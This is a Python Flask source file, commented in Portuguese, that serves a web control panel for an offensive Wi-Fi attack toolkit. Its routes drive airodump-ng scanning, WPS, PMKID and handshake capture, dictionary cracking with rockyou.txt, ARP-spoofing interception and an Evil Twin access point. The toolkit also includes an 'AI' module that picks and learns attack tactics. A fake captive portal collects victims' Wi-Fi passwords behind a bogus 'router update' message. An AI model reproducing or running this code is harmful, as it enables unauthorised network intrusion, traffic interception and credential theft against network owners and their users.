import os
import time
import csv
import subprocess
import threading
from datetime import datetime
from flask import Flask, render_template, request, jsonify

# Importa o núcleo
import wifi_auditor
from wifi_auditor import run_command, set_monitor_mode, set_managed_mode, capture_pmkid, capture_handshake, crack_hash, identify_vendor, analyze_vulnerabilities, capture_wps, fix_drivers_wifi6, start_ghost_attack, boost_signal, start_wifite_expert, start_evil_twin, capture_vetor_x, run_autopilot, update_zero_day
from dsi_sniffer import DSISniffer, spoof, scan_network

from dsi_twin import DSITwin

from dsi_twin import DSITwin
from dsi_ai import DSIAI

app = Flask(__name__)

# Variáveis globais
BRAIN = DSIAI()
CURRENT_MONITOR_IFACE = None
CURRENT_MANAGED_IFACE = None
SCAN_PROCESS = None
CSV_PREFIX = "web_scan_results"
SESSION_LOGS = []
SNIFFER_INSTANCE = None
SPOOF_ACTIVE = False
TWIN_INSTANCE = None

def add_log(msg, log_type="info", is_command=False):
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = {"time": timestamp, "msg": msg, "type": log_type, "cmd": is_command}
    SESSION_LOGS.append(log_entry)
    print(f"[{timestamp}] [{log_type.upper()}] {msg}")

wifi_auditor.WEB_CALLBACK = add_log

@app.route('/')
def dashboard(): return render_template('index.html')

@app.route('/api/logs', methods=['GET'])
def get_logs():
    last_idx = request.args.get('last', default=0, type=int)
    new_logs = SESSION_LOGS[last_idx:]
    return jsonify({"status": "success", "logs": new_logs, "next_idx": len(SESSION_LOGS)})

@app.route('/api/report', methods=['GET'])
def get_report():
    lines = "".join([f"<div style='margin-bottom:5px; color:{'#ff00ff' if l['type']=='cmd' else '#00ccff' if l['type']=='info' else '#ff3300'}'>[{l['time']}] {l['msg']}</div>" for l in SESSION_LOGS])
    return f"<html><body style='background:#050505; color:#00ff00; font-family:monospace; padding:40px;'><h1>RELATÓRIO DSI SUPREMO</h1><hr>{lines}</body></html>"

@app.route('/api/interfaces', methods=['GET'])
def get_interfaces():
    stdout, _ = run_command("iw dev | awk '$1==\"Interface\"{print $2}'")
    interfaces = stdout.split('\n') if stdout else []
    return jsonify({"status": "success", "interfaces": [i for i in interfaces if i], "os_type": "linux"})

@app.route('/api/start_monitor', methods=['POST'])
def start_monitor():
    global CURRENT_MONITOR_IFACE, CURRENT_MANAGED_IFACE
    iface = request.get_json().get('interface')
    if not iface: return jsonify({"status": "error"}), 400
    CURRENT_MANAGED_IFACE = iface
    CURRENT_MONITOR_IFACE = set_monitor_mode(iface)
    if CURRENT_MONITOR_IFACE: return jsonify({"status": "success", "monitor_interface": CURRENT_MONITOR_IFACE})
    return jsonify({"status": "error"}), 500

@app.route('/api/start_scan', methods=['POST'])
def start_scan():
    global SCAN_PROCESS, CURRENT_MONITOR_IFACE
    if not CURRENT_MONITOR_IFACE: return jsonify({"status": "error", "message": "Não armado."}), 400
    add_log("Varredura Ativa DSI Iniciada.", log_type="cmd", is_command=True)
    run_command(f"rm -f {CSV_PREFIX}-01.*")
    cmd = f"airodump-ng --band abg --output-format csv -w {CSV_PREFIX} --update 1 {CURRENT_MONITOR_IFACE}"
    SCAN_PROCESS = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return jsonify({"status": "success"})

@app.route('/api/stop_scan', methods=['POST'])
def stop_scan():
    global SCAN_PROCESS
    if SCAN_PROCESS:
        SCAN_PROCESS.terminate(); run_command("killall airodump-ng", sudo=True); SCAN_PROCESS = None
    return jsonify({"status": "success"})

@app.route('/api/get_networks', methods=['GET'])
def get_networks():
    csv_file = f"{CSV_PREFIX}-01.csv"; networks = []
    if os.path.exists(csv_file):
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f); in_ap = False
                for row in reader:
                    if not row or len(row) < 14: continue
                    if row[0].strip() == "BSSID": in_ap = True; continue
                    if row[0].strip() == "Station MAC": break
                    if in_ap:
                        bssid = row[0].strip(); essid = row[13].strip()
                        if essid and essid != "\x00":
                            networks.append({'bssid': bssid, 'signal': row[8].strip(), 'channel': row[3].strip(), 'privacy': row[5].strip(), 'essid': essid, 'vendor': identify_vendor(bssid)})
        except: pass
    networks.sort(key=lambda x: int(x['signal']) if x['signal'].lstrip('-').isdigit() else -100, reverse=True)
    return jsonify({"status": "success", "networks": networks})

@app.route('/api/network/scan', methods=['POST'])
def api_scan_network():
    global CURRENT_MANAGED_IFACE, CURRENT_MONITOR_IFACE
    # O scanner funciona melhor em modo managed e conectado, ou monitor interface se estiver UP
    iface = CURRENT_MANAGED_IFACE or "wlan0"
    add_log(f"Iniciando Mapeamento ARP na interface {iface}...", log_type="cmd", is_command=True)
    devices = scan_network(iface)
    add_log(f"Mapeamento concluído. {len(devices)} dispositivos identificados.")
    return jsonify({"status": "success", "devices": devices})

def attack_task(attack_type, bssid, channel, essid, privacy):
    vendor = identify_vendor(bssid)
    _, advice = analyze_vulnerabilities(vendor, essid, privacy)
    
    # Integração de Inteligência Artificial
    ai_advice = BRAIN.get_strategy(bssid)
    
    add_log(f"COMBATE INICIADO: {essid} ({vendor})", log_type="cmd", is_command=True)
    add_log(f"DSI INTEL: {advice}")
    add_log(f"DSI NEURAL NET: {ai_advice}", log_type="info")
    
    prefix = f"web_capture_{essid.replace(' ', '_')}"
    cap_file = None
    success = False
    
    if attack_type == 'wps':
        success = capture_wps(CURRENT_MONITOR_IFACE, bssid, channel)
        BRAIN.learn(bssid, essid, 'wps', success)
        return
    if attack_type == 'ghost': 
        start_ghost_attack(CURRENT_MONITOR_IFACE, essid)
        BRAIN.learn(bssid, essid, 'ghost', True)
        return
    if attack_type == 'wifite': 
        start_wifite_expert(CURRENT_MONITOR_IFACE)
        return
    if attack_type == 'autopilot': 
        cap_file = run_autopilot(CURRENT_MONITOR_IFACE, {"essid":essid, "bssid":bssid, "channel":channel})
        if cap_file == "WPS_SUCCESS":
            return
        elif not cap_file:
            add_log("A IA Esgotou as táticas de rádio. Recomenda-se Vetor EVIL TWIN.", log_type="warning")
            return
    elif attack_type == 'vetorx': 
        cap_file = capture_vetor_x(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
        BRAIN.learn(bssid, essid, 'vetorx', cap_file is not None)
    elif attack_type == 'pmkid':
        cap_file = capture_pmkid(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
        BRAIN.learn(bssid, essid, 'pmkid', cap_file is not None)
        if not cap_file: 
            cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
            BRAIN.learn(bssid, essid, 'handshake', cap_file is not None)
    else: 
        cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
        BRAIN.learn(bssid, essid, 'handshake', cap_file is not None)
        
    if cap_file:
        wordlist = "/usr/share/wordlists/rockyou.txt"
        if os.path.exists(wordlist): crack_hash(cap_file, wordlist, bssid)
    else: add_log("Alvo resistiu aos vetores táticos.", log_type="error")

@app.route('/api/attack', methods=['POST'])
def launch_attack():
    global CURRENT_MONITOR_IFACE
    data = request.get_json()
    threading.Thread(target=attack_task, args=(data['attack_type'], data['bssid'], data['channel'], data['essid'], data.get('privacy',''))).start()
    return jsonify({"status": "success"})

@app.route('/api/sniff/start', methods=['POST'])
def start_sniff():
    global CURRENT_MONITOR_IFACE, SNIFFER_INSTANCE
    if not SNIFFER_INSTANCE:
        iface = CURRENT_MONITOR_IFACE or "wlan0"
        SNIFFER_INSTANCE = DSISniffer(iface, log_callback=add_log)
        SNIFFER_INSTANCE.start()
    return jsonify({"status": "success"})

@app.route('/api/sniff/stop', methods=['POST'])
def stop_sniff():
    global SNIFFER_INSTANCE
    if SNIFFER_INSTANCE: SNIFFER_INSTANCE.stop(); SNIFFER_INSTANCE = None
    return jsonify({"status": "success"})

@app.route('/api/mitm/start', methods=['POST'])
def start_mitm():
    global SPOOF_ACTIVE, CURRENT_MONITOR_IFACE, CURRENT_MANAGED_IFACE
    data = request.get_json(); target_ip = data.get('target_ip'); gateway_ip = data.get('gateway_ip')
    if not target_ip or not gateway_ip: return jsonify({"status": "error"}), 400
    iface = CURRENT_MONITOR_IFACE or CURRENT_MANAGED_IFACE or "wlan0"
    def run_spoof():
        global SPOOF_ACTIVE
        SPOOF_ACTIVE = True
        add_log(f"Envenenando ARP via {iface}: {target_ip} <-> {gateway_ip}", log_type="cmd", is_command=True)
        while SPOOF_ACTIVE:
            if not spoof(target_ip, gateway_ip, iface):
                add_log("Falha no Spoofing: Dispositivos não respondem.", log_type="error"); break
            time.sleep(2)
    threading.Thread(target=run_spoof, daemon=True).start()
    return jsonify({"status": "success"})

@app.route('/api/mitm/stop', methods=['POST'])
def stop_mitm():
    global SPOOF_ACTIVE; SPOOF_ACTIVE = False
    return jsonify({"status": "success"})

@app.route('/api/fix/wifi6', methods=['POST'])
def fix_wifi6():
    threading.Thread(target=fix_drivers_wifi6, args=(True,)).start()
    return jsonify({"status": "success"})

@app.route('/api/update', methods=['POST'])
def run_update():
    threading.Thread(target=update_zero_day).start()
    return jsonify({"status": "success", "message": "Iniciando atualização de arsenal Zero-Day..."})

@app.route('/api/autopilot/stop', methods=['POST'])
def stop_autopilot():
    import wifi_auditor
    wifi_auditor.AUTOPILOT_ACTIVE = False
    add_log("Sinal de interrupção enviado ao Autopiloto.", log_type="warning")
    return jsonify({"status": "success"})

@app.route('/api/restore', methods=['POST'])
def restore():
    global CURRENT_MONITOR_IFACE, CURRENT_MANAGED_IFACE, SCAN_PROCESS
    if SCAN_PROCESS: SCAN_PROCESS.terminate(); run_command("killall airodump-ng", sudo=True); SCAN_PROCESS = None
    if CURRENT_MONITOR_IFACE: set_managed_mode(CURRENT_MONITOR_IFACE); CURRENT_MONITOR_IFACE = None
    return jsonify({"status": "success"})

@app.route('/api/twin/start', methods=['POST'])
def start_twin():
    global TWIN_INSTANCE, CURRENT_MANAGED_IFACE, SCAN_PROCESS, CURRENT_MONITOR_IFACE
    data = request.get_json()
    ssid = data.get('ssid')
    iface = CURRENT_MANAGED_IFACE or "wlan0"
    
    # Interrompe o Radar e o Sniffer antes do Twin (conflito de rádio)
    if SCAN_PROCESS:
        SCAN_PROCESS.terminate(); run_command("killall airodump-ng", sudo=True); SCAN_PROCESS = None
        add_log("Radar desativado para liberar o hardware.")

    if not TWIN_INSTANCE:
        TWIN_INSTANCE = DSITwin(iface, ssid)
        TWIN_INSTANCE.generate_configs()
        TWIN_INSTANCE.start(log_callback=add_log)
        return jsonify({"status": "success", "message": f"Evil Twin '{ssid}' ativo."})
    return jsonify({"status": "error", "message": "Evil Twin já em execução."})

@app.route('/api/twin/stop', methods=['POST'])
def stop_twin():
    global TWIN_INSTANCE
    if TWIN_INSTANCE:
        TWIN_INSTANCE.stop()
        TWIN_INSTANCE = None
        add_log("Evil Twin desativado.")
    return jsonify({"status": "success"})

@app.route('/capture', methods=['GET', 'POST'])
def capture_page():
    if request.method == 'POST':
        password = request.form.get('password')
        add_log(f"!!! [VITÓRIA] SENHA CAPTURADA VIA EVIL TWIN: {password}", log_type="error")
        return "<h1>Atualização completa. Reiniciando roteador...</h1>"
    # Serve o Portal Cativo se for um GET (redirecionamento DNS)
    return render_template('captive.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
